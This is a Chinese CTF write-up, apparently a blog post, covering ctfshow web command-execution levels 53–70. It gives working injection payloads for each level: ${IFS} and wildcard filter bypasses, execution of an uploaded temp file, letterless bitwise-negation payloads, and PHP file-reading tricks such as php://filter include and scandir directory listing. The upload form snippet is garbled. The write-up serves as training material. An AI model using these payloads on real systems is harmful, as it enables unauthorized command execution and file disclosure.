#  ctfshow web入门命令执行3  
zoe
                    zoe  哦0吼   2026-02-11 04:05  
  
Web53  
  
与上一关差不多，但先echo出参数后面system执行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsExzVZSXJaIibnJgf2OL35wR6f6KrMouUp2Dro1lrsbRXk4Td152uTry5vBIcUibV60wcoW5fyxMjdFGia8QLUz3ejYxNAEBdq7bd8/640?wx_fmt=png "")  
  
   
  
/?c=nl${IFS}fla''g.php  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEzQrBPJVxuhYStrwibx8s86ocQWjk5lsq8LPqesNmAbzWYydLSOxn8Yd9aGiakZhxFfzWSYTAeRJfMjvd19XpNGbibyY9JEjiawU0M/640?wx_fmt=png "")  
  
Web53  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEzdm5IriamnrTyFKeZtH4S0CIy0hNGJLqiaDSibNb1gqdrJgfQneKcmTGjBicNib1vMCQt37I4rvpzQUJZPjicG6ek1ia8pb8KUeibhK9k/640?wx_fmt=png "")  
  
过滤了很多，很多查看命令都不能用，换个思路，我们发现mv没有禁用，那我们修改flag文件名字，在打开文件呢？  
  
/?c=mv${IFS}fla?.php${IFS}a.txt  
  
然后再访问a.txt得到flag  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEwedw2mZlHaYd0VghF2uZPBGqzrCVaGvDQJO1ej6lRS3lpHcMjiahWm5mKCJNpib44CZHvMUM5pBgF5dHrJbuWev0Sbg7gCqHHYc/640?wx_fmt=png "")  
  
Web54  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEyp9icv7aX73CRnlhJwnpGODicYblkjql1HSXPpwApt9SWMu33hDbv2XXPcQicnjS5Qd5XAC5YkNTCC2bgicOBmm53gkpNYsiauOzB0/640?wx_fmt=png "")  
  
这关把字母都过滤了，无字母rce，没有过滤点号  
  
那么  
php强行上传文件  
  
在本地运行下面脚本，然后抓包，尝试修改内容，得到flag  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEzEXPWfvGN2n3nvtprsEWhhL79CJFCm3uFfItnIaH3WAGjyDR4IS26HQoTibl1gSrhkpbsXca9BFuMnya6c8yvXKXZXmbzkSxX4/640?wx_fmt=png "")  
  
  
      
  
      
      <input  
                </inputname="file" type="file" />  
  
      
      <input  
                </inputtype="submit" type="submit " />  
  
     
  
  
   
  
?c=.+/???/????????[@-[]  
  
   
  
所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么我们只要找到一个可以表示“大写字母”的通配符，就能精准找到我们要执行的文件。查看ascii码表，可见大写字母位于@与[之间,那么，我们可以利用[@-[]来表示大写字母：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEyWuJeYVnKfgib52GCCu82IeHGibMvqN2qXG3HPFa2ibb9mJrbn1NiaOick3ehDgUTRl3OAaSqM1NurSjAoBgMOHXA0Kz0GBCeGcfLc/640?wx_fmt=png "")  
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEyQdQygH8UeDjR1klpC0SrlYY0AGKPswcmQZBa9BiaaLfoS4nWg5PcJic6jhLujSdefyPibIY9CiaWZMSYQnDbSBfdL0CSSobtIQqY/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsExsPsibxbWOe96NY2WntPnkGMsPiaWRZUaFGRJBemWsBoSX4bK51ZkOyg1BpYBTM05wGMyYDqW59fKibvqPUayJdOWC9SibaxmA0g0/640?wx_fmt=png "")  
  
把下面改成tac f* 得到flag  
  
   
  
其他方法：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsExXxwpkljKvHTdHjU1nPJdGiaicGzPUkiayNicfcvboQPQPPKOocZslQqyq5LyrqpQPvpaVKfvqk4oPCLKQLwGWZ70MGhrqgG0vfx0/640?wx_fmt=png "")  
  
（来自  
ctfshow web入门--命令执行_ctfshow web入门命令执行-CSDN博客  
）  
  
   
  
Web56 同上  
  
   
  
Web57  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEy9brkAibTBLGUwnktZAuo4AIPiciaNYuOuf2Qe0Thib7d54YuNLJhUkzuFfnzX9yVJYBUSdG9wXwmAdC0KOJia6DqKgkmmp0icyaays/640?wx_fmt=png "")  
  
这关提示flag在36.php  
  
过滤了字母数字，我们可以用取反  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEzRmG5xiaibqQ0SNB6V3E216FV4NB9E1DCApPcHWbDslteoicKGSicBnm2qdeCicCDbVt5z2MYDOjCtb2okRH8gk9Uj6SbKCrwm0r0o/640?wx_fmt=png "")  
  
?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsExvL6XB0TPOVKzc7hjZURt30XtGicd7OIzOLo6tUicuePDtTa7myKgC0xGT77UfT5wRJtq5KhJ0vqRNlwX6dBU8IR1uKSZn0wuWY/640?wx_fmt=png "")  
  
Web58  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsExh77JiaK35g6OpeBul7S56veNbpLl02jGVlSRtXD0dVRiaWzYASTVf5VskYOYPZzexfBNqzAgog5b5BhJk5h0SGz0etalgOiayVY/640?wx_fmt=png "")  
  
这一关介绍说突破禁用函数  
  
Post传参  
  
我们可以先尝试phpinfo(),system(),exec(),shell_exec()都被禁用  
  
发现file_get_contens(‘index.php’);可以成功  
  
那么尝试  
c=echo file_get_contents('flag.php');查看源代码得到flag  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEx5p9yYT0zuXKs8yibiaicaDf1vIWbo7w69Gj3Y5PCTibCoJQ2eg5nhXcM8QY0iaCiaZRa7ic3mP3vndnpVcXlXXLv2yupqN6UecwllwY/640?wx_fmt=png "")  
  
   
  
Web59  
  
和上一关类似，发现include还能用  
  
c=include('flag.php');var_dump(get_defined_vars());  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEzh3fdicicwaibY1Zfz2WXlaazHDzVG7Qia7r9TgZfOpjicFBPJXZva9GKMnicwFUumQawAXyIyrDlp3H2yEKnWW2zXd0CqZuFWOnjO4/640?wx_fmt=png "")  
  
   
  
法二：  
  
GET传参： /?1=php://filter/convert.base64-encode/resource=flag.php  
  
POST传参： c=include ($_GET[1]);  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsExWYIvlsc0cskPkjXic4mWjPdVyFEibDkNjQfuB2Qt6eSAO4TePv1M9KpNXnOF9hNemG3KGSFibR0YiarshN8ksrfHtVEFcuMU5guQ/640?wx_fmt=png "")  
  
   
  
   
  
Web60-65  
  
同上，也可以用  
c=highlight_file('flag.php');  
  
c=include('flag.php');echo $flag;  
  
c=show_source('flag.php');  
  
c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));  
  
c=include('flag.txt');var_dump(get_defined_vars());  
  
   
  
Web66 web67  
  
发现用之前的得到  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEyJAVIjOHCTuzIRykZ9No9TF8nLmzIdeUJtBFfbjoibHiatvv2BQQHxibSut0CGcDsyhLlbXkSuJWVjrT2sTvQJHPPLVsTbkULGdY/640?wx_fmt=png "")  
  
c=var_dump(scandir('.'));  
     
显示当前目录下内容  
  
c=var_dump(scandir('/'));  
     
显示根目录下内容  
  
c=print_r(scandir('.'));     //查看当前目录  
  
c=print_r(scandir('/'));        //查看根目录  
  
c=var_export(scandir('/'));  
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsExYTL9ibcWm8VyrE2rp3ScXBVBrHRkVHhLDExLNFjic2FupqxDibY7C0hdWQibd52tAFAoBWs0vt6rx6kCz6zTMxNDKAibNo9tJszOw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEwpmBasickHUeiaK2sQT6zcTRx0JuuebaBRztyheJfbJPYN5toXHvvxUF1xa81Ks83fSz7xricb1PEBXQYZSJJcfnZicRflUkVLX20/640?wx_fmt=png "")  
  
猜测flag在flag.txt里面  
  
c=highlight_file('/flag.txt');  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsExAmvNQ4XPTECsr5t91HhLI4SqqKzbfIyE9CRqTSu7BF2oWLy3S7P6WPaC5NSQ9PX5YCFpUicO0CVP7KRD63gTcmIA4oRsmMGicE/640?wx_fmt=png "")  
  
Web68 69 70  
  
c=include('/flag.txt');   
  
